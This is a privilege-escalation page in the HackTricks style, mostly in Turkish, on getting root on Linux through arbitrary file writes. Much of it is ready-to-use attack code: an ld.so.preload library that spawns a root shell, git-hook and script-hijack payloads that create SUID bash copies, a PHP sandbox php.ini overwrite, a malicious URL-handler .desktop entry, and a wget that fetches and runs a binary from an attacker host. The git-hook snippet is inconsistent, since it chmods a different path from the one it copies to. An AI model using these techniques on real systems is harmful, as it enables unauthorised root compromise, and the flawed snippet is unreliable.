# Root'a Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** çevre değişkeni gibi davranır ancak **SUID binaries** içinde de çalışır.\
Eğer bu dosyayı oluşturabilir veya değiştirebilirseniz, çalıştırılan her ikili dosya ile yüklenecek bir kütüphanenin **yolunu ekleyebilirsiniz**.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) bir git deposunda commit oluşturulduğunda, merge yapıldığında gibi çeşitli **events** sırasında **run** edilen **scripts**'tır. Eğer bir **privileged script or user** bu işlemleri sıkça gerçekleştiriyorsa ve **write in the `.git` folder`** mümkünse, bu **privesc** için kullanılabilir.

Örneğin, bir git deposunda **generate a script** oluşturup bunu **`.git/hooks`** içine koymak mümkündür; böylece yeni bir commit oluşturulduğunda her zaman çalıştırılır:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zaman dosyaları

TODO

### Servis & Soket dosyaları

TODO

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP'yi `php` ile **restricted `php.ini`** kullanarak çalıştırıp doğrular (ör. `disable_functions=exec,system,...`). Eğer sandboxlanmış kod hâlâ **any write primitive** (ör. `file_put_contents`) içeriyorsa ve daemon'un kullandığı **exact `php.ini` path**'ine erişebiliyorsanız, kısıtlamaları kaldırmak için **overwrite that config** yapabilir ve ardından ayrıcalıklı olarak çalışan ikinci bir payload gönderebilirsiniz.

Tipik akış:

1. İlk payload sandbox konfigürasyonunu overwrite eder.
2. İkinci payload, tehlikeli fonksiyonlar yeniden etkinleştirildiği için kodu çalıştırır.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

`/proc/sys/fs/binfmt_misc` konumundaki dosya hangi ikili dosyanın hangi tür dosyaları çalıştıracağını belirtir. TODO: yaygın bir dosya türü açıldığında bunu kötüye kullanarak rev shell çalıştırmak için gereksinimleri kontrol et.

### Overwrite schema handlers (like http: or https:)

Hedefin yapılandırma dizinlerine yazma izni olan bir saldırgan, sistem davranışını değiştiren dosyaları kolayca değiştirebilir veya oluşturabilir; bu da istem dışı kod çalıştırmaya yol açar. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL işleyicilerini kötü amaçlı bir dosyaya yönlendirecek şekilde değiştirmek (ör. `x-scheme-handler/http=evil.desktop` olarak ayarlamak) ile saldırgan, **herhangi bir http veya https bağlantısına tıklamanın o `evil.desktop` dosyasında belirtilen kodu tetiklemesini** sağlar. Örneğin, `$HOME/.local/share/applications` içine `evil.desktop` dosyasına aşağıdaki kötü amaçlı kod yerleştirildikten sonra, herhangi bir harici URL tıklaması gömülü komutu çalıştırır:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root'ın kullanıcı yazılabilir script/binary'leri çalıştırması

Eğer ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` (veya yetkisiz bir kullanıcının sahip olduğu bir dizin içindeki herhangi bir binary) gibi bir şeyi çalıştırıyorsa, bunu ele geçirebilirsiniz:

- **Detect the execution:** süreçleri [pspy](https://github.com/DominicBreuker/pspy) ile izleyin; root'un kullanıcı kontrollü yolları çağırmasını yakalamak için:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrulayın:** hedef dosyanın ve dizinin her ikisinin de kullanıcınız tarafından owned/writable olduğundan emin olun.
- **Hedefi ele geçirin:** orijinal binary/script'in yedeğini alın ve SUID shell (veya başka herhangi bir root action) oluşturan bir payload bırakın, sonra izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Yetkili eylemi tetikleyin** (ör. helper'ı başlatan bir UI düğmesine basmak). root hijacked path'i yeniden çalıştırdığında, escalated shell'i `./rootshell -p` ile alın.

## Referanslar

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
